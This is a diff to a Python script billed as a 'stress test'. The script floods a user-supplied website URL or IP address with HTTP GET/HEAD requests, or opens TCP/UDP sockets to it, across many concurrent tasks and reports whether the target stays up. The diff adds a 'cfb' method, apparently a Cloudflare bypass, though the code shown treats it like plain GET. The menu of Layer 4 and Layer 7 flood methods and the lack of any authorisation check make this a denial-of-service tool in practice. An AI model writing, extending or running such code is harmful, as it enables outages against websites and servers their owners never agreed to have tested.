@@ -7,11 +7,11 @@ from colorama import Fore, Style, init
 
 init()
 
-print("Layer 7: get, head")
+print("Layer 7: get, head, cfb")
 print("Layer 4: tcp, udp")
-protocol = input("Enter the method to use: ")
+protocol = input("Enter the method to use:")
 
-if protocol in ["get", "head"]:
+if protocol in ["get", "head", "cfb"]:
     url = input("Enter the website URL (including http or https): ")
 elif protocol in ["tcp", "udp"]:
     ip = input("Enter the IP address of the server: ")
@@ -29,18 +29,28 @@ elif protocol == "tcp":
 packet_counter = 0
 packet_counter_lock = threading.Lock()
 
-async def stress_test(thread_id, client):
+async def stress_test(thread_id):
     global packet_counter
+
+    if protocol == "cfb":
+        client = httpx.AsyncClient()
+    elif protocol in ["get", "head"]:
+        client = httpx.AsyncClient()
+    elif protocol in ["tcp", "udp"]:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    else:
+        print(Fore.RED + f"Invalid protocol: {protocol}" + Style.RESET_ALL)
+        return
 
     start_time = time.time()
     last_print_time = start_time - 9
     if thread_id == 0:
-        if protocol in ["get", "head"]:
+        if protocol in ["get", "head", "cfb"]:
             print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
         elif protocol in ["tcp", "udp"]:
             print(Fore.YELLOW + f"Stress testing started on {ip}:{port} successfully!" + Style.RESET_ALL)
     while time.time() - start_time < duration:
-        if protocol in ["get", "head"]:
+        if protocol in ["get", "head", "cfb"]:
             await send_request(client)
             with packet_counter_lock:
                 packet_counter += 1
@@ -50,10 +60,10 @@ async def stress_test(thread_id, client):
                 packet_counter += 1
         if thread_id == 0 and time.time() - last_print_time >= 10:
             with packet_counter_lock:
-                if protocol in ["get", "head"]:
+                if protocol in ["get", "head", "cfb"]:
                     try:
                         response_start_time = time.time()
-                        response = await client.get(url)
+                        response = await httpx.AsyncClient().get(url)
                         response_end_time = time.time()
                         response_time = round((response_end_time - response_start_time) * 1000, 2)
                         print(Fore.GREEN + f"Website is up. Response time: {response_time} ms." + Style.RESET_ALL)
@@ -84,14 +94,14 @@ def send_packet(sock):
         pass 
 
 async def main():
-    async with httpx.AsyncClient(limits=httpx.Limits(max_connections=1000)) as client:
-        tasks = []
-        for i in range(num_threads):
-            task = asyncio.create_task(stress_test(i, client))
-            tasks.append(task)
+    tasks = []
+    for i in range(num_threads):
+        task = asyncio.ensure_future(stress_test(i))
+        tasks.append(task)
 
-        await asyncio.gather(*tasks)
+    await asyncio.gather(*tasks)
 
-asyncio.run(main())
+loop = asyncio.get_event_loop()
+loop.run_until_complete(main())
 
 print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
